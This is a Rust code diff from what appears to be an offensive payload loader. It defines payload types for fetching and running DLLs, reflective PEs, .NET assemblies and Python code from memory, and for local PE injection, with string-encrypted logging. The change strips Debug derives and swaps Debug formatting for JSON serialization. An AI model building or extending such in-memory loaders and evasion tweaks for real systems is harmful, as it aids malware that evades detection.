@@ -49,7 +49,7 @@ pub enum PayloadExecThread {
     Thread(thread::JoinHandle<()>, Payload),
 }
 
-#[derive(PartialEq, Serialize, Deserialize, Debug, Clone)]
+#[derive(PartialEq, Serialize, Deserialize, Clone)]
 pub enum Payload {
     Banner(),
     Print(Print),
@@ -88,14 +88,11 @@ impl Payload {
             }
         }
     }
-    pub fn print_payload(&self) {
-        debug!("{:#?}", self);
-    }
     pub fn print_payload_compact(&self) {
-        debug!("+{:?}", self);
+        debug!("+{}", self.string_payload_compact());
     }
     pub fn string_payload_compact(&self) -> String {
-        format!("{:?}", self)
+        format!("{}", serde_json::to_string(self).unwrap_or_default())
     }
     pub fn is_same_payload(&self, other_payload: &Payload) -> bool {
         let self_serialized = serde_json::to_string(self).unwrap();
@@ -168,7 +165,7 @@ impl Payload {
     }
 }
 
-#[derive(PartialEq, Serialize, Deserialize, Debug, Clone)]
+#[derive(PartialEq, Serialize, Deserialize, Clone)]
 pub struct DllFromMemory {
     pub link: Link,
     pub dll_entrypoint: String,
@@ -242,7 +239,7 @@ pub fn dll_from_memory_exec(data: Vec<u8>, dll_entrypoint: String, dll_commandli
     info!("{}", encrypt_string!("DllFromMemory: end"));
 }
 
-#[derive(PartialEq, Serialize, Deserialize, Debug, Clone)]
+#[derive(PartialEq, Serialize, Deserialize, Clone)]
 pub struct ExecPython {
     pub path: String, //path of python directory
     pub python_code: String,
@@ -327,7 +324,7 @@ pub fn banner() -> Result<PayloadExecThread, anyhow::Error> {
 pub fn stoploader() -> Result<PayloadExecThread, anyhow::Error> {
     std::process::exit(0);
 }
-#[derive(PartialEq, Serialize, Deserialize, Debug, Clone)]
+#[derive(PartialEq, Serialize, Deserialize, Clone)]
 pub struct WriteZip {
     pub link: Link,
     pub path: String,
@@ -347,8 +344,8 @@ impl WriteZip {
                 Ok(data) => break data,
                 Err(e) => {
                     error!(
-                        "retry={}/{} Fail fetch_data {:?}",
-                        retries, self.retry, self.link
+                        "retry={}/{} Fail fetch_data {}",
+                        retries, self.retry, serde_json::to_string(&self.link).unwrap_or_default()
                     );
                     if retries == 0 {
                         return Err(e);
@@ -379,7 +376,7 @@ impl WriteZip {
     }
 }
 
-#[derive(PartialEq, Serialize, Deserialize, Debug, Clone)]
+#[derive(PartialEq, Serialize, Deserialize, Clone)]
 pub struct WriteFile {
     pub link: Link,
     pub path: String,
@@ -406,7 +403,7 @@ impl WriteFile {
     }
 }
 
-#[derive(PartialEq, Serialize, Deserialize, Debug, Clone)]
+#[derive(PartialEq, Serialize, Deserialize, Clone)]
 pub struct Exec {
     pub path: String,
     //pub commandline: CommandLine,
@@ -507,7 +504,7 @@ impl Exec {
 }
 */
 
-#[derive(PartialEq, Serialize, Deserialize, Debug, Clone)]
+#[derive(PartialEq, Serialize, Deserialize, Clone)]
 pub struct ReflectivePEFromMemory {
     pub link: Link,
     pub thread: bool,
@@ -556,7 +553,7 @@ impl ReflectivePEFromMemory {
 use crate::local_pe_injection::main::local_pe_injection;
 //#[cfg(target_os = "windows")]
 
-#[derive(PartialEq, Serialize, Deserialize, Debug, Clone)]
+#[derive(PartialEq, Serialize, Deserialize, Clone)]
 pub struct LocalPeInjection {
     pub link: Link,
     pub commandline: CommandLine,
@@ -603,7 +600,7 @@ impl LocalPeInjection {
 #[cfg(target_os = "windows")]
 use clroxide::clr::Clr;
 
-#[derive(PartialEq, Serialize, Deserialize, Debug, Clone)]
+#[derive(PartialEq, Serialize, Deserialize, Clone)]
 pub struct DotnetFromMemory {
     pub link: Link,
     pub commandline: CommandLine,
@@ -656,7 +653,7 @@ impl DotnetFromMemory {
     }
 }
 
-#[derive(PartialEq, Serialize, Deserialize, Debug, Clone)]
+#[derive(PartialEq, Serialize, Deserialize, Clone)]
 pub struct Print {
     pub msg: CommandLine,
     pub runonce: bool,
